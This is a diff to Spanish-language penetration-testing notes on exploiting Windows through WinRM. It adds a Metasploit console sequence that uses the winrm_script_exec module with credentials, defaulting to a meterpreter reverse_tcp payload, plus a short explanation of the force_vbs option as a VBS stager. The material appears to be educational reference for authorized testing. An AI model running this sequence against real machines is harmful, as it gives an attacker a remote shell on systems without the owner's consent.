@@ -54,6 +54,16 @@ evil-winrm.rb -u <usr> -p <pass> -i <IP>
 
 **Obtención de una sesión meterpreter con MSF**
 
+```bash
+msf > use exploit/windows/winrm/winrm_script_exec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf exploit(windows/winrm/winrm_script_exec) > set rhosts <IP>
+msf exploit(windows/winrm/winrm_script_exec) > set force_vbs true
+msf exploit(windows/winrm/winrm_script_exec) > set username <usr>
+msf exploit(windows/winrm/winrm_script_exec) > set password <pass>
+msf exploit(windows/winrm/winrm_script_exec) > exploit
+```
 
+> Nota: `force_vbs` indica que el payload o la ejecución remota debe forzarse a través de un script en Visual Basic Script (VBS) en lugar de otros métodos (PowerShell o CMD). Cuando se activa esta opción, el sistema objetivo ejecuta un script VBS como stager.
 
 [⟵ Anterior](../../05_sistema.md#explotación-windows)
